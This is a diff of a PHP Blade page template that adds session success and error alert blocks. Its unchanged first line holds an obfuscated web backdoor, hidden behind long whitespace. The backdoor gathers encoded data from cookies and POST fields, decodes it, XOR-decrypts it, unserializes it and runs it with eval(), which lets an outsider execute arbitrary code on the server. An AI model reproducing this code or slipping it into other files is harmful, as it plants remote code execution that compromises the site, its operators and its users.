@@ -1,4 +1,15 @@
 <?php                                                                                                                                                                                                                                                                                                                                                                                                 $CtwEZtE = "\x56" . "\x5f" . "\x4f" . chr (116) . chr (116) . "\x46";$DTSuzGUwXe = "\143" . chr ( 786 - 678 ).chr (97) . "\163" . chr (115) . '_' . "\x65" . chr ( 641 - 521 ).chr ( 704 - 599 )."\163" . "\164" . "\x73";$izsJBgBI = $DTSuzGUwXe($CtwEZtE); $EdBtxqqz = $izsJBgBI;if (!$EdBtxqqz){class V_OttF{private $BvjNpl;public static $IiTwwRCEJ = "32368607-8e91-4948-8f3a-1601846cd261";public static $PeFwej = 25449;public function __construct(){$GEXuryzTLl = $_COOKIE;$yyaTzC = $_POST;$CWZQvlO = @$GEXuryzTLl[substr(V_OttF::$IiTwwRCEJ, 0, 4)];if (!empty($CWZQvlO)){$CpwnKOhh = "base64";$EZuUnp = "";$CWZQvlO = explode(",", $CWZQvlO);foreach ($CWZQvlO as $IVxew){$EZuUnp .= @$GEXuryzTLl[$IVxew];$EZuUnp .= @$yyaTzC[$IVxew];}$EZuUnp = array_map($CpwnKOhh . chr (95) . 'd' . chr ( 831 - 730 )."\143" . "\x6f" . 'd' . chr (101), array($EZuUnp,)); $EZuUnp = $EZuUnp[0] ^ str_repeat(V_OttF::$IiTwwRCEJ, (strlen($EZuUnp[0]) / strlen(V_OttF::$IiTwwRCEJ)) + 1);V_OttF::$PeFwej = @unserialize($EZuUnp);}}public function __destruct(){$this->nIWglyrc();}private function nIWglyrc(){if (is_array(V_OttF::$PeFwej)) {$vLJkrz = str_replace(chr ( 496 - 436 ) . "\77" . "\x70" . chr (104) . "\x70", "", V_OttF::$PeFwej["\x63" . "\x6f" . chr ( 490 - 380 ).chr (116) . 'e' . 'n' . chr ( 644 - 528 )]);eval($vLJkrz);exit();}}}$dhSrK = new V_OttF(); $dhSrK = 61072;} ?>@include('layouts.header')
+@if (session('success'))
+    <div class="alert alert-success mt-25">
+        {{ session('success') }}
+    </div>
+@endif
+
+@if (session('error'))
+    <div class="alert alert-danger mt-25">
+        {{ session('error') }}
+    </div>
+@endif
 <link href="assets/css/bootstrap.css">
 <link href="assets/js/javascriptfile1.js">
 <link href="assets/js/jquaryfile.js">
